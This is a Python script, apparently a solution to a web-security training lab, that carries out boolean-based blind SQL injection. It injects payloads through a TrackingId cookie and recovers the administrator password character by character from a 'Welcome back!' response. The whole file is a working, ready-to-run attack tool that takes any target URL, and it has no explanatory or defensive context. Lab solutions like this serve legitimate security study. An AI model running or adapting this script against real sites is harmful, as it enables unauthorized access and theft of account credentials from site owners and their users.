import requests
from bs4 import BeautifulSoup
import string
import sys
from requests.adapters import HTTPAdapter, Retry


def search_text(response):
    soup = BeautifulSoup(response.text, "html.parser")
    return "Welcome back!" in soup.text


def enumerate_password_length(url, session):
    for i in range(1, 50):
        payload = f"ABC' OR (select username from users where username='administrator' AND LENGTH(password)={i})='administrator"
        response = session.get(url, cookies={"TrackingId": payload})
        if search_text(response):
            password_length = i
            break
    return password_length


def enumerate_password(url, session, password_length):
    alphanumeric_characters = string.ascii_lowercase + string.digits
    password = ""
    print(f"(+) Enumerating password...")
    for i in range(1, password_length + 1):
        for j in alphanumeric_characters:
            payload = f"ABC' OR (select username from users where username='administrator' AND SUBSTRING(password,{i},1)='{j}')='administrator"
            response = session.get(url, cookies={"TrackingId": payload})
            if search_text(response):
                password += j
                print("\r" + password, end="", flush=True)
                break
            else:
                print("\r" + password + j, end="", flush=True)


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)


    url = sys.argv[1]
    session = requests.Session()
    session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))

    print("(+) Enumerating Password Length...")
    password_length = enumerate_password_length(url, session)
    print(f"(+) Password Length: {password_length} characters ")
    enumerate_password(url, session, password_length)
    print()


if __name__ == "__main__":
    main()
